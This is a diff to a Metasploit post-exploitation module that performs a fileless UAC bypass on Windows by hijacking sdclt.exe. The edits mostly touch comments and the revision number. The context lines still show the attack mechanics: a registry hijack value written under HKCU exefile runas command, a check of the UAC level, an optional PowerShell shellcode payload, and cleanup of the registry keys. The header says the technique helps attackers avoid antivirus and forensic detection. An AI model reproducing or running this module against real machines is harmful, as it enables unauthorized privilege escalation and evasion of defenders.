@@ -28,7 +28,6 @@
 # has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
 # the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
 # file on the file system that can be caught by AV/HIPS or forensically identified later.
-# "This module differs from 'OJ msf module' because it uses cmd.exe insted of powershell.exe"
 # "This module will not work if target UAC level its set to 'Always Notify'"
 #
 #
@@ -61,7 +60,6 @@
 # msf exploit(handler) > use post/windows/escalate/enigma_fileless_IsolatedCommand
 # msf post(enigma_fileless_IsolatedCommand) > info
 # msf post(enigma_fileless_IsolatedCommand) > show options
-# msf post(enigma_fileless_IsolatedCommand) > show targets
 # msf post(enigma_fileless_IsolatedCommand) > show advanced options
 # msf post(enigma_fileless_IsolatedCommand) > set [option(s)]
 # msf post(enigma_fileless_IsolatedCommand) > exploit
@@ -69,11 +67,10 @@
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
-# 1 - /etc/init.d/postgresql start
+# 1 - service postgresql start
 # 2 - msfdb delete (optional)
 # 3 - msfdb init   (optional)
-# 4 - msfconsole
-# 5 - reload_all
+# 4 - msfconsole -x 'reload_all'
 ##
 
 
@@ -112,7 +109,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [sdclt.exe]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe. This module will create the required registry entry in the current user’s hive, set the reg_sz value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -121,7 +118,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
+                        'Version'        => '$Revision: 1.3',
                         'DisclosureDate' => 'mar 18 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -156,7 +153,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
                         ], self.class) 
 
         end
@@ -182,9 +179,9 @@ end
 
   r=''
   vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
-  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  vul_value = "isolatedCommand" # vulnerable reg value to create
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode base64)
+  uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
+  vul_value = "isolatedCommand" # vulnerable registry value to create
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
   psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
@@ -320,13 +317,13 @@ def ls_stage2
     end
 
  # Delete hijacking hive keys from target regedit ..
- # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
+ # REG DELETE HKCU\Software\Classes\exefile /f
  print_good(" exec => Deleting HKCU hive registry keys ..")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
 
-      # check if remote registry hive keys was deleted successefuly
+      # check if remote registry hijack key was deleted successefuly
       if registry_getvaldata("#{chec_hive}","#{vul_value}")
         print_warning("Module can not verify if deletion has successefully!")
       else
